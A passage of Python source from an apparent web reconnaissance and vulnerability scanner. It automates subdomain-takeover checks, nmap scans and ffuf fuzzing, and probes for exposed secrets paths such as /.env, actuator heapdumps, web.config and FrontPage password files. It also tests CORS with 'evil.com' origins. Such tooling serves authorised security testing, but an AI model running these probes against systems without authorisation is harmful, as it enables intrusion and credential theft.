        if tt != TargetType.DOMAIN:
            print(f"  {Fore.YELLOW}[SKIP] Subdomain enum — target is IP")
        return
    section("Subdomain Enumeration & Takeover Detection", out)

    host = target.split(':')[0]
    subdomains = []
    if _tool_ok("subfinder", out):
        stdout, _, _ = run_cmd(["subfinder", "-d", host, "-silent"],
                               "subfinder", out, cfg, 120)
        if stdout:
            subdomains = [s.strip() for s in stdout.splitlines() if s.strip()]

    # Scope-filter discovered subdomains
    if scope.enabled:
        before = len(subdomains)
        subdomains = [s for s in subdomains if scope.check(s)]
        if before != len(subdomains):
            print(f"  {Fore.YELLOW}  [SCOPE] Filtered {before - len(subdomains)} out-of-scope subdomains")

    if subdomains:
        if _tool_ok("subjack", out):
            subs_file = f"/tmp/subs_{hashlib.md5(host.encode()).hexdigest()}.txt"
            open(subs_file, 'w').write('\n'.join(subdomains))
            run_cmd(["subjack", "-w", subs_file, "-t", "50", "-timeout", "30", "-ssl"],
                    "subjack takeover scan", out, cfg, 300)
        _takeover_fingerprints(subdomains, out, phase, cfg)

    st.mark(phase)


_TAKEOVER_FP = {
    "github.io":         "There isn't a GitHub Pages site here",
    "s3.amazonaws.com":  "NoSuchBucket",
    "herokudns.com":     "No such app",
    "azurewebsites.net": "404 Web Site not found",
    "shopify.com":       "Sorry, this shop is currently unavailable",
    "fastly.net":        "Fastly error: unknown domain",
    "surge.sh":          "project not found",
    "bitbucket.io":      "Repository not found",
}

def _takeover_fingerprints(subdomains: List[str], out: str, phase: str, cfg: ScanConfig):
    """Fixed: uses make_session to honour proxy/UA/timeout config."""
    _log(out, "\n## Takeover Fingerprint Check")
    sess = make_session(cfg)
    for sub in subdomains[:50]:
        try:
            res = subprocess.run(["dig", "+short", "CNAME", sub],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 text=True, timeout=5)
            cname = res.stdout.strip()
            if not cname: continue
            for svc, fp in _TAKEOVER_FP.items():
                if svc in cname:
                    try:
                        r = sess.get(f"https://{sub}", timeout=cfg.timeout)
                        if fp.lower() in r.text.lower():
                            add_finding(Finding(
                                title=f"Subdomain Takeover: {sub}",
                                severity=Severity.HIGH,
                                description=f"{sub} → CNAME {cname} ({svc}) returns takeover fingerprint.",
                                evidence=f"CNAME: {cname}\nFingerprint: {fp}",
                                recommendation="Remove dangling DNS record or reclaim the resource.",
                                phase=phase), out, cfg)
                    except Exception:
                        pass
        except Exception:
            continue


def phase_favicon_hash(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Compute mmh3 hash of /favicon.ico for Shodan pivoting."""
    phase = "favicon_hash"
    if st.done(phase): return
    section("Favicon Hash (Shodan Pivot)", out)

    sess = make_session(cfg)
    try:
        r = sess.get(f"{cfg.base_url}/favicon.ico", timeout=cfg.timeout)
        if not r.ok or len(r.content) < 10:
            _log(out, f"> No favicon at {cfg.base_url}/favicon.ico (HTTP {r.status_code})")
            st.mark(phase); return

        sha256 = hashlib.sha256(r.content).hexdigest()
        _log(out, f"- Favicon SHA-256: `{sha256}`")
        _log(out, f"- Size: {len(r.content)} bytes")

        if _HAS_MMH3:
            # Shodan-compatible: b64-encode with \n every 76 chars, then mmh3
            b64 = base64.encodebytes(r.content).decode()
            mmh3_hash = mmh3.hash(b64)
            _log(out, f"- Favicon mmh3 (Shodan): `{mmh3_hash}`")
            _log(out, f"- Shodan query: `http.favicon.hash:{mmh3_hash}`")
            add_finding(Finding(
                title=f"Favicon Hash: {mmh3_hash}",
                severity=Severity.INFO,
                description=f"mmh3 favicon hash computed. Pivot via Shodan: http.favicon.hash:{mmh3_hash}",
                evidence=f"SHA-256: {sha256}\nmmh3: {mmh3_hash}",
                recommendation="Consider rotating favicon if leakage of related infra is a concern.",
                phase=phase), out, cfg)
        else:
            _log(out, "> mmh3 not installed (pip install mmh3) — Shodan pivot unavailable.")
            add_finding(Finding(
                title=f"Favicon SHA-256: {sha256[:16]}…",
                severity=Severity.INFO,
                description="Favicon retrieved. Install mmh3 for Shodan-compatible hash.",
                evidence=f"SHA-256: {sha256}",
                phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> Favicon fetch failed: {e}")
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 2 — ACTIVE RECONNAISSANCE
# ═════════════════════════════════════════════════════════════════════════════

def phase_port_scan(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "port_scan"
    if st.done(phase): return
    section("Port Scanning (nmap)", out)
    if not _tool_ok("nmap", out):
        st.mark(phase); return

    host = target.split(':')[0]
    sp = _sudo()
    if cfg.full_ports:
        run_cmd(sp + ["nmap", "-vv", "-sV", "-Pn", "-p-", "--min-rate", "1000",
                      "-oA", f"/tmp/nmap_full_{host}", host],
                "Nmap full TCP scan", out, cfg, 2400)
    else:
        ports = ("21,22,23,25,53,80,81,88,110,143,389,443,445,465,587,636,993,995,"
                 "1080,1443,2049,3000,3306,3389,4443,4848,5000,5432,5900,6379,7001,"
                 "7443,8000,8080,8081,8443,8444,8888,9000,9090,9200,9443,10000,27017")
        run_cmd(sp + ["nmap", "-vv", "-sV", "-Pn", f"-p{ports}",
                      "-oA", f"/tmp/nmap_web_{host}", host],
                "Nmap web & common ports", out, cfg, 600)

    run_cmd(sp + ["nmap", "--script=http-methods", "-p", "80,443,8080,8443", host],
            "HTTP Methods NSE", out, cfg, 120)
    st.mark(phase)


def phase_waf_cdn(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "waf_cdn"
    if st.done(phase): return
    section("WAF / CDN Fingerprinting", out)

    if _tool_ok("wafw00f", out):
        stdout, _, _ = run_cmd(["wafw00f", cfg.base_url, "-a"], "wafw00f", out, cfg, 60)
        if stdout and ("is behind" in stdout.lower() or "detected" in stdout.lower()):
            add_finding(Finding(
                title="WAF Detected",
                severity=Severity.INFO,
                description="A Web Application Firewall was identified.",
                evidence=stdout[:500],
                recommendation="Note WAF type for bypass testing.",
                phase=phase), out, cfg)

    cdn_sigs = {
        "Cloudflare":    ["cf-ray", "cf-cache-status"],
        "AWS CloudFront":["x-amz-cf-id", "x-amz-cf-pop"],
        "Akamai":        ["x-akamai-transformed"],
        "Fastly":        ["x-fastly-request-id"],
        "Azure CDN":     ["x-msedge-ref"],
        "Sucuri":        ["x-sucuri-id"],
    }
    try:
        sess = make_session(cfg)
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        hdrs = {k.lower() for k in r.headers}
        found = [cdn for cdn, sigs in cdn_sigs.items() if any(s in hdrs for s in sigs)]
        if found:
            add_finding(Finding(
                title=f"CDN Detected: {', '.join(found)}",
                severity=Severity.INFO,
                description=f"Target is behind: {', '.join(found)}",
                evidence=str(dict(r.headers)),
                phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> CDN check failed: {e}")
    st.mark(phase)


def phase_vhost_fuzz(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "vhost_fuzz"
    if st.done(phase): return
    section("Virtual Host Fuzzing", out)

    if not _tool_ok("ffuf", out):
        st.mark(phase); return

    host = target.split(':')[0]
    candidates = [
        "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        "/opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
    ]
    wl = next((w for w in candidates if os.path.exists(w)), None)
    if not wl:
        _log(out, "> No wordlist found for vhost fuzzing."); st.mark(phase); return

    try:
        sess = make_session(cfg)
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        fs = str(len(r.content))
    except Exception:
        fs = "0"

    run_cmd(["ffuf", "-u", cfg.base_url, "-w", wl,
             "-H", f"Host: FUZZ.{host}",
             "-mc", "200,301,302,307,401,403",
             "-fs", fs, "-t", str(min(cfg.rate, 50)), "-timeout", "10"],
            "ffuf vhost fuzzing", out, cfg, 300)
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 3 — TECHNOLOGY & CONTENT DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def phase_tech_detection(target: str, cfg: ScanConfig, out: str, st: ScanState) -> Dict:
    """Returns detected tech dict for playbook dispatch."""
    phase = "tech_detection"
    if st.done(phase): return {}
    section("Technology Detection", out)
    detected = {}

    # WhatWeb dumps every plugin including HTTP-header recognisers like
    # 'access-control-allow-methods', 'x-frame-options', 'country', 'ip',
    # 'cookies', 'redirectlocation', 'uncommonheaders' etc. These are not
    # technologies — they're meta-info — and they pollute playbook matching.
    # Filter against a denylist of known-noisy plugin names.
    JUNK_PLUGINS = {
        'access-control-allow-methods', 'access-control-allow-origin',
        'access-control-allow-headers', 'access-control-allow-credentials',
        'country', 'ip', 'redirectlocation', 'uncommonheaders',
        'cookies', 'frame', 'script', 'title', 'httponly',
        'strict-transport-security', 'x-frame-options', 'x-ua-compatible',
        'x-content-type-options', 'content-security-policy',
        'permissions-policy', 'referrer-policy', 'pingback',
        'meta-author', 'meta-generator', 'meta-keywords', 'passwordfield',
        'email', 'header-hash', 'html5', 'via-proxy', 'x-powered-by',
    }

    if _tool_ok("whatweb", out):
        stdout, _, _ = run_cmd(["whatweb", "-v", "-a", "3",
                                "--log-json=/tmp/whatweb.json", cfg.base_url],
                               "WhatWeb", out, cfg, cfg.whatweb_timeout)
        # Parse whatweb JSON output
        try:
            if os.path.exists("/tmp/whatweb.json"):
                with open("/tmp/whatweb.json") as fh:
                    for line in fh:
                        try:
                            entry = json.loads(line)
                            for plug in entry.get('plugins', {}):
                                pl = plug.lower()
                                if pl in JUNK_PLUGINS:
                                    continue
                                detected[pl] = entry['plugins'][plug]
                        except Exception:
                            continue
        except Exception:
            pass
        # Also parse text output as fallback
        if stdout:
            for tech in ('wordpress', 'drupal', 'joomla', 'tomcat', 'jenkins',
                         'spring', 'laravel', 'django', 'flask', 'express',
                         'asp.net', 'asp_net', 'nginx', 'apache', 'iis',
                         'nodejs', 'php', 'ruby', 'rails'):
                if tech in stdout.lower():
                    detected.setdefault(tech, True)

    if _tool_ok("webanalyze", out):
        run_cmd(["webanalyze", "-host", cfg.base_url], "webanalyze", out, cfg, 60)

    # Header-based tech detection (always runs, doesn't need any tool)
    try:
        sess = make_session(cfg)
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        for hdr_key, hdr_val in r.headers.items():
            hk = hdr_key.lower()
            hv = hdr_val.lower()
            if hk == 'server':
                for tech in ('iis', 'nginx', 'apache', 'tomcat', 'jetty',
                             'kestrel', 'gunicorn', 'uvicorn'):
                    if tech in hv:
                        detected[tech] = hdr_val
            if hk == 'x-powered-by':
                for tech in ('asp.net', 'php', 'express', 'next.js'):
                    if tech in hv:
                        detected[tech.replace('.', '_')] = hdr_val
            if hk == 'x-aspnet-version' or hk == 'x-aspnetmvc-version':
                detected['asp_net'] = hdr_val
    except Exception:
        pass

    if detected:
        _log(out, f"\n## Detected Technologies (filtered)\n"
                  f"```\n{json.dumps(list(detected.keys()), indent=2)}\n```")
    st.mark(phase)
    return detected


def phase_tech_playbooks(target: str, cfg: ScanConfig, out: str,
                          st: ScanState, detected: Dict):
    """Dispatch tech-specific deep-dive tools based on detected stack."""
    phase = "tech_playbooks"
    if st.done(phase): return
    if not detected:
        _log(out, "> No technologies detected — skipping playbooks.")
        st.mark(phase); return

    section("Tech-Specific Playbooks", out)
    detected_lower = {k.lower() for k in detected.keys()}

    # WordPress
    if any('wordpress' in t for t in detected_lower):
        if _tool_ok("wpscan", out):
            cmd = ["wpscan", "--url", cfg.base_url, "--no-banner",
                   "--random-user-agent", "--enumerate", "vp,vt,u1-10",
                   "--format", "cli-no-colour"]
            if cfg.proxy: cmd += ["--proxy", cfg.proxy]
            run_cmd(cmd, "wpscan (WordPress)", out, cfg, 600)

    # Drupal
    if any('drupal' in t for t in detected_lower):
        if _tool_ok("droopescan", out):
            run_cmd(["droopescan", "scan", "drupal", "-u", cfg.base_url],
                    "droopescan (Drupal)", out, cfg, 300)

    # Joomla
    if any('joomla' in t for t in detected_lower):
        if _tool_ok("joomscan", out):
            run_cmd(["joomscan", "--url", cfg.base_url], "joomscan", out, cfg, 600)

    # Laravel — check for .env and debug artefacts
    if any('laravel' in t for t in detected_lower):
        sess = make_session(cfg)
        for path in ("/.env", "/telescope", "/_ignition/health-check",
                     "/_debugbar/open", "/horizon"):
            try:
                r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
                if r.status_code == 200 and len(r.content) > 20:
                    sev = Severity.CRITICAL if path == "/.env" else Severity.HIGH
                    add_finding(Finding(
                        title=f"Laravel Exposed Endpoint: {path}",
                        severity=sev,
                        description=f"Laravel sensitive endpoint accessible: {path}",
                        evidence=f"GET {cfg.base_url}{path} → HTTP 200\n{r.text[:500]}",
                        recommendation=f"Restrict {path} to authorised users or remove from production.",
                        phase=phase), out, cfg)
            except Exception:
                continue

    # Spring Boot — actuator enumeration
    if any('spring' in t for t in detected_lower):
        sess = make_session(cfg)
        for path in ("/actuator", "/actuator/env", "/actuator/heapdump",
                     "/actuator/mappings", "/actuator/beans", "/actuator/trace",
                     "/actuator/httptrace", "/actuator/threaddump", "/actuator/health",
                     "/env", "/heapdump", "/mappings", "/trace"):
            try:
                r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
                if r.status_code == 200:
                    sev = Severity.CRITICAL if path in ("/actuator/env", "/actuator/heapdump",
                                                         "/env", "/heapdump") else Severity.HIGH
                    add_finding(Finding(
                        title=f"Spring Actuator Exposed: {path}",
                        severity=sev,
                        description=f"Spring Boot actuator endpoint accessible: {path}",
                        evidence=f"GET {cfg.base_url}{path} → HTTP 200\n{r.text[:500]}",
                        recommendation="Restrict actuator endpoints to authorised users (management.endpoints.web.exposure.include).",
                        phase=phase), out, cfg)
            except Exception:
                continue

    # Tomcat
    if any('tomcat' in t for t in detected_lower):
        sess = make_session(cfg)
        for path in ("/manager/html", "/manager/status", "/host-manager/html",
                     "/manager/text/list", "/examples/"):
            try:
                r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
                if r.status_code in (200, 401):
                    add_finding(Finding(
                        title=f"Tomcat Endpoint: {path} (HTTP {r.status_code})",
                        severity=Severity.MEDIUM if r.status_code == 401 else Severity.HIGH,
                        description=f"Tomcat manager/host-manager reachable at {path}.",
                        evidence=f"GET {cfg.base_url}{path} → HTTP {r.status_code}",
                        recommendation="Restrict /manager and /host-manager by IP. Disable /examples in production.",
                        phase=phase), out, cfg)
            except Exception:
                continue

    # Jenkins
    if any('jenkins' in t for t in detected_lower):
        sess = make_session(cfg)
        for path in ("/script", "/manage", "/asynchPeople/", "/jnlpJars/jenkins-cli.jar"):
            try:
                r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
                if r.status_code == 200:
                    add_finding(Finding(
                        title=f"Jenkins Endpoint Exposed: {path}",
                        severity=Severity.HIGH,
                        description=f"Jenkins sensitive endpoint reachable: {path}",
                        evidence=f"GET {cfg.base_url}{path} → HTTP 200",
                        recommendation="Enforce authentication on all Jenkins endpoints; restrict /script (RCE).",
                        phase=phase), out, cfg)
            except Exception:
                continue

    # ASP.NET / IIS — common admin/debug endpoints
    aspnet_indicators = ('asp.net', 'asp_net', 'iis', 'kestrel')
    if any(any(ind in t for ind in aspnet_indicators) for t in detected_lower):
        sess = make_session(cfg)
        # (path, severity, recommendation)
        ASPNET_PROBES = [
            ("/Trace.axd",          Severity.HIGH,
             "Disable trace.axd in production (web.config: <trace enabled='false'/>)."),
            ("/elmah.axd",          Severity.HIGH,
             "Restrict elmah.axd to authenticated admin users (allowRemoteAccess='false' or auth)."),
            ("/elmah.axd/csv",      Severity.HIGH,
             "Restrict elmah.axd CSV export to authenticated admin users."),
            ("/elmah.axd/download", Severity.HIGH,
             "Restrict elmah.axd download to authenticated admin users."),
            ("/web.config",         Severity.CRITICAL,
             "Web.config must NEVER be downloadable. Verify static-content handler config."),
            ("/web.config.bak",     Severity.CRITICAL,
             "Remove backup configuration file."),
            ("/_vti_bin/_vti_aut/author.dll", Severity.MEDIUM,
             "Disable FrontPage Server Extensions if not in use."),
            ("/_vti_pvt/service.pwd",  Severity.HIGH,
             "Remove FrontPage password file from webroot."),
            ("/aspnet_client/",     Severity.LOW,
             "Verify directory listing is disabled on /aspnet_client/."),
            ("/App_Data/",          Severity.MEDIUM,
             "App_Data should not be web-accessible. Verify request filtering."),
            ("/bin/",               Severity.MEDIUM,
             "/bin should be inaccessible. Verify request filtering rules."),
            ("/App_Code/",          Severity.MEDIUM,
             "App_Code should not be web-accessible."),
            ("/Global.asax",        Severity.LOW,
             "Verify Global.asax cannot be downloaded as source."),
            ("/Default.aspx?aspxerrorpath=/", Severity.LOW,
             "Custom error pages should not leak stack traces."),
        ]
        for path, sev, rec in ASPNET_PROBES:
            try:
                r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout,
                             allow_redirects=False)
                if r.status_code != 200:
                    continue
                # Catch-all suppression
                if looks_like_catchall(cfg, r.text, len(r.content)):
                    continue
                # Confirmation strings per endpoint to avoid generic 200s
                body_l = r.text.lower()
                confirms = {
                    "/trace.axd":     "application trace" in body_l or "request details" in body_l,
                    "/elmah.axd":     "error log" in body_l or "elmah" in body_l,
                    "/web.config":    "<configuration" in body_l or "<system.web" in body_l,
                    "/web.config.bak":"<configuration" in body_l or "<system.web" in body_l,
                    "/_vti_pvt/service.pwd": ":" in r.text and "\n" in r.text,
                    "/global.asax":   "application_start" in body_l or "<%@" in body_l,
                }
                # For paths not in confirms, accept any 200 (directory listings etc.)
                key = path.lower().split('?')[0]
                if key in confirms and not confirms[key]:
                    continue

                add_finding(Finding(
                    title=f"ASP.NET/IIS Endpoint Exposed: {path}",
                    severity=sev,
                    description=f"ASP.NET/IIS sensitive endpoint reachable: {path}",
                    evidence=f"GET {cfg.base_url}{path} → HTTP 200\n{r.text[:300]}",
                    recommendation=rec,
                    phase=phase), out, cfg)
            except Exception:
                continue

    st.mark(phase)


def phase_robots_sitemap(target: str, tt: TargetType, cfg: ScanConfig,
                           out: str, st: ScanState):
    phase = "robots_sitemap"
    if st.done(phase): return
    section("Robots.txt, Sitemap & security.txt", out)
    sess = make_session(cfg)
    for path in ["/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
                 "/.well-known/security.txt", "/.well-known/change-password"]:
        try:
            r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
            # Skip catch-all hits — server is returning the homepage, not the file
            if r.status_code == 200 and looks_like_catchall(cfg, r.text, len(r.content)):
                _log(out, f"\n### `{path}` — HTTP 200 *(catch-all — actual file does not exist)*")
                continue
            _log(out, f"\n### `{path}` — HTTP {r.status_code}\n```\n{r.text[:2000]}\n```")
            if r.status_code == 200 and path == "/robots.txt":
                # Verify it actually looks like robots.txt before parsing
                if not re.search(r'(?i)^\s*(user-agent|disallow|allow|sitemap)\s*:',
                                  r.text, re.M):
                    _log(out, "> ⚠️ /robots.txt response doesn't look like robots.txt — skipping parse.")
                    continue
                disallowed = [l.split(':', 1)[1].strip() for l in r.text.splitlines()
                              if l.lower().startswith('disallow:') and
                              len(l.split(':', 1)) > 1 and l.split(':', 1)[1].strip() not in ('', '/')]
                if disallowed:
                    add_finding(Finding(
                        title="robots.txt Reveals Interesting Paths",
                        severity=Severity.INFO,
                        description=f"{len(disallowed)} Disallow entries may indicate sensitive endpoints.",
                        evidence='\n'.join(disallowed[:20]),
                        recommendation="Review disallowed paths for sensitive functionality.",
                        phase=phase), out, cfg)
                    # Feed into discovered endpoints for later fuzzing
                    DISCOVERED.add_urls([f"{cfg.base_url}{p}" for p in disallowed if p.startswith('/')])
        except Exception as e:
            _log(out, f"> {path}: {e}")
    st.mark(phase)


def phase_crawler(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Katana-based crawling. Feeds URLs/params into DISCOVERED for downstream phases."""
    phase = "crawler"
    if st.done(phase): return
    section("URL Crawling (katana)", out)
    if not _tool_ok("katana", out):
        _log(out, "> katana not installed — install via `go install github.com/projectdiscovery/katana/cmd/katana@latest`")
        st.mark(phase); return

    host = target.split(':')[0]
    output_file = f"/tmp/katana_{hashlib.md5(host.encode()).hexdigest()}.txt"

    cmd = ["katana", "-u", cfg.base_url, "-d", "3", "-jc",
           "-silent", "-o", output_file, "-timeout", "10",
           "-c", str(min(cfg.threads * 2, 10))]
    if cfg.proxy:
        cmd += ["-proxy", cfg.proxy]
    # Thread cookies through if authenticated
    if cfg.cookie:
        cmd += ["-H", f"Cookie: {cfg.cookie}"]
    if cfg.extra_headers:
        for h in cfg.extra_headers:
            cmd += ["-H", h]

    run_cmd(cmd, "katana crawler", out, cfg, 300)

    if os.path.exists(output_file):
        with open(output_file) as fh:
            urls = [l.strip() for l in fh if l.strip()]
        DISCOVERED.add_urls(urls)
        params = set()
        for u in urls:
            try:
                q = urlparse(u).query
                if q:
                    for k in parse_qs(q).keys():
                        params.add(k)
            except Exception:
                continue
        DISCOVERED.add_params(params)
        _log(out, f"\n## Crawler Results\n- URLs: {len(urls)}\n- Unique params: {len(params)}")
        print(f"  {Fore.GREEN}✓ katana: {len(urls)} URLs, {len(params)} params")

        if urls:
            add_finding(Finding(
                title=f"Crawler: {len(urls)} URLs Discovered",
                severity=Severity.INFO,
                description=f"katana crawler discovered {len(urls)} URLs and {len(params)} unique parameters.",
                evidence='\n'.join(urls[:30]),
                phase=phase), out, cfg)
    st.mark(phase)


def phase_content_discovery(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "content_discovery"
    if st.done(phase): return
    if not cfg.auto and not yes_no("Run content discovery (ffuf)?"):
        _log(out, "> Skipped by user."); st.mark(phase); return
    section("Content Discovery (ffuf)", out)
    if not _tool_ok("ffuf", out):
        st.mark(phase); return

    wl_candidates = [
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/opt/SecLists/Discovery/Web-Content/common.txt",
    ]
    wl = next((w for w in wl_candidates if os.path.exists(w)), None)

    if wl:
        cmd = ["ffuf", "-u", f"{cfg.base_url}/FUZZ", "-w", wl,
               "-mc", "200,204,301,302,307,401,403",
               "-t", str(min(cfg.rate, 100)), "-timeout", "10"]
        if cfg.delay > 0:
            cmd += ["-p", str(cfg.delay)]
        if cfg.cookie:
            cmd += ["-b", cfg.cookie]
        for h in cfg.extra_headers:
            cmd += ["-H", h]
        run_cmd(cmd, f"ffuf general discovery ({os.path.basename(wl)})", out, cfg, 600)

    admin_paths = [
        "admin", "administrator", "admin.php", "admin/login", "wp-admin", "wp-login.php",
        "cpanel", "plesk", "phpmyadmin", "manager/html", "console", "dashboard",
        "portal", "backend", "jenkins", "grafana", "kibana", "adminer", "phppgadmin",
        "controlpanel", "moderator", "webadmin", "login", "signin",
    ]
    admin_wl = f"/tmp/admin_wl_{hashlib.md5(target.encode()).hexdigest()}.txt"
    open(admin_wl, 'w').write('\n'.join(admin_paths))
    run_cmd(["ffuf", "-u", f"{cfg.base_url}/FUZZ", "-w", admin_wl,
             "-mc", "200,301,302,307,401,403", "-t", "20", "-timeout", "10"],
            "ffuf admin panel discovery", out, cfg, 120)
    st.mark(phase)


def phase_param_discovery(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Arjun-based hidden parameter discovery against discovered endpoints."""
    phase = "param_discovery"
    if st.done(phase): return
    section("Hidden Parameter Discovery (Arjun)", out)
    if not _tool_ok("arjun", out):
        _log(out, "> arjun not installed — `pip install arjun`")
        st.mark(phase); return

    # Pick a sample of endpoints to probe (base URL + up to 10 crawled endpoints)
    urls_to_probe = [cfg.base_url]
    with DISCOVERED._lock:
        # endpoints are paths without query — rebuild full URLs
        endpoints = sorted(DISCOVERED.endpoints)[:10]
    for ep in endpoints:
        full = urljoin(cfg.base_url, ep)
        if full not in urls_to_probe:
            urls_to_probe.append(full)

    output_file = f"/tmp/arjun_{hashlib.md5(target.encode()).hexdigest()}.json"
    urls_file = f"/tmp/arjun_urls_{hashlib.md5(target.encode()).hexdigest()}.txt"
    open(urls_file, 'w').write('\n'.join(urls_to_probe))

    cmd = ["arjun", "-i", urls_file, "-oJ", output_file,
           "-t", str(min(cfg.threads * 2, 10)), "--stable"]
    if cfg.cookie:
        cmd += ["--headers", f"Cookie: {cfg.cookie}"]
    run_cmd(cmd, "arjun parameter discovery", out, cfg, cfg.arjun_timeout)

    if os.path.exists(output_file):
        try:
            with open(output_file) as fh:
                data = json.load(fh)
            total = 0
            for url, info in data.items() if isinstance(data, dict) else []:
                params = info.get('params', []) if isinstance(info, dict) else []
                if params:
                    total += len(params)
                    DISCOVERED.add_params(params)
                    add_finding(Finding(
                        title=f"Hidden Parameters Discovered: {url}",
                        severity=Severity.MEDIUM,
                        description=f"{len(params)} hidden parameters accept input at {url}.",
                        evidence=f"URL: {url}\nParams: {', '.join(params)}",
                        recommendation="Review each parameter for input validation and intended use.",
                        phase=phase), out, cfg)
            _log(out, f"\n## Arjun Summary: {total} hidden params across {len(data) if isinstance(data, dict) else 0} URLs")
        except Exception as e:
            _log(out, f"> Failed to parse arjun output: {e}")
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 4 — HTTP ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

_SEC_HEADERS = {
    "strict-transport-security": (Severity.HIGH,
        "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
    "content-security-policy":   (Severity.MEDIUM,
        "Implement a Content-Security-Policy to restrict resource loading."),
    "x-frame-options":           (Severity.MEDIUM,
        "Add: X-Frame-Options: DENY to prevent clickjacking."),
    "x-content-type-options":    (Severity.LOW,
        "Add: X-Content-Type-Options: nosniff"),
    "referrer-policy":           (Severity.LOW,
        "Add: Referrer-Policy: strict-origin-when-cross-origin"),
    "permissions-policy":        (Severity.LOW,
        "Add a Permissions-Policy header to control browser feature access."),
}

def phase_header_analysis(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "header_analysis"
    if st.done(phase): return
    section("Security Header & Cookie Analysis", out)
    sess = make_session(cfg)
    try:
        r = sess.get(cfg.base_url, timeout=cfg.timeout, allow_redirects=True)
        hdrs = {k.lower(): v for k, v in r.headers.items()}
        _log(out, f"```\n{json.dumps(dict(r.headers), indent=2)}\n```")

        for hdr, (sev, rec) in _SEC_HEADERS.items():
            if hdr not in hdrs:
                add_finding(Finding(
                    title=f"Missing Header: {hdr}",
                    severity=sev,
                    description=f"Response does not include `{hdr}`.",
                    evidence=f"Checked: {cfg.base_url}",
                    recommendation=rec,
                    phase=phase), out, cfg)

        for hdr, desc in [("server", "Server software"), ("x-powered-by", "Framework/language"),
                           ("x-aspnet-version", "ASP.NET version"),
                           ("x-aspnetmvc-version", "ASP.NET MVC version")]:
            if hdr in hdrs:
                add_finding(Finding(
                    title=f"Information Disclosure: {hdr}",
                    severity=Severity.LOW,
                    description=f"{desc} disclosed: `{hdrs[hdr]}`",
                    evidence=f"{hdr}: {hdrs[hdr]}",
                    recommendation=f"Remove or sanitise the `{hdr}` header.",
                    phase=phase), out, cfg)

        # Cookie audit
        for cookie in r.cookies:
            issues = []
            if not cookie.secure:
                issues.append("Missing Secure flag")
            # Inspect this cookie's own attributes rather than the merged header
            if not (cookie.has_nonstandard_attr('HttpOnly') or
                    cookie.has_nonstandard_attr('httponly')):
                issues.append("Missing HttpOnly")
            samesite = (cookie.get_nonstandard_attr('SameSite') or
                        cookie.get_nonstandard_attr('samesite') or '')
            if not samesite:
                issues.append("Missing SameSite")
            elif samesite.lower() == 'none' and not cookie.secure:
                issues.append("SameSite=None without Secure")
            if issues:
                add_finding(Finding(
                    title=f"Cookie Issues: {cookie.name}",
                    severity=Severity.MEDIUM,
                    description=f"`{cookie.name}`: {', '.join(issues)}",
                    evidence=f"Cookie: {cookie.name}\nIssues: {', '.join(issues)}",
                    recommendation="Set Secure, HttpOnly, and SameSite=Strict on all session cookies.",
                    phase=phase), out, cfg)

        if r.status_code == 401 and 'www-authenticate' in hdrs:
            add_finding(Finding(
                title="HTTP Basic Authentication Detected",
                severity=Severity.MEDIUM,
                description=f"Realm: {hdrs['www-authenticate']}",
                evidence=f"HTTP 401 + WWW-Authenticate: {hdrs['www-authenticate']}",
                recommendation="Prefer OAuth/OIDC. Enforce strong credentials.",
                phase=phase), out, cfg)

        try:
            res = subprocess.run(["curl", "--http2", "-sI", cfg.base_url, "--max-time", "5"],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
            if "HTTP/2" in res.stdout:
                _log(out, "> HTTP/2 supported")
        except Exception:
            pass

        try:
            chain = [h.url for h in r.history] + [r.url]
            if len(chain) > 1:
                _log(out, "\n## Redirect Chain\n```\n" + " → ".join(chain) + "\n```")
                http_hops = [u for u in chain if u.startswith('http://')]
                if http_hops and 'https' in cfg.base_url:
                    add_finding(Finding(
                        title="HTTP in Redirect Chain (Mixed Content)",
                        severity=Severity.MEDIUM,
                        description="Redirect chain includes an HTTP hop before reaching HTTPS.",
                        evidence=" → ".join(chain),
                        recommendation="Ensure all redirects use HTTPS throughout.",
                        phase=phase), out, cfg)
        except Exception:
            pass

    except Exception as e:
        _log(out, f"> Header analysis failed: {e}")
    st.mark(phase)


def phase_cors(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "cors"
    if st.done(phase): return
    section("CORS Misconfiguration", out)
    sess = make_session(cfg)
    host = target.split(':')[0]
    test_origins = [
        "https://evil.com",
        f"https://{host}.evil.com",
        f"https://evil.{host}",
        "null",
    ]
    for origin in test_origins:
        try:
            r = sess.get(cfg.base_url, headers={"Origin": origin}, timeout=cfg.timeout)
            acao = r.headers.get('Access-Control-Allow-Origin', '')
            acac = r.headers.get('Access-Control-Allow-Credentials', '').lower()
            _log(out, f"- Origin: `{origin}` → ACAO: `{acao}` ACAC: `{acac}`")
            if acao in (origin, '*'):
                sev = Severity.HIGH if acac == 'true' else Severity.MEDIUM
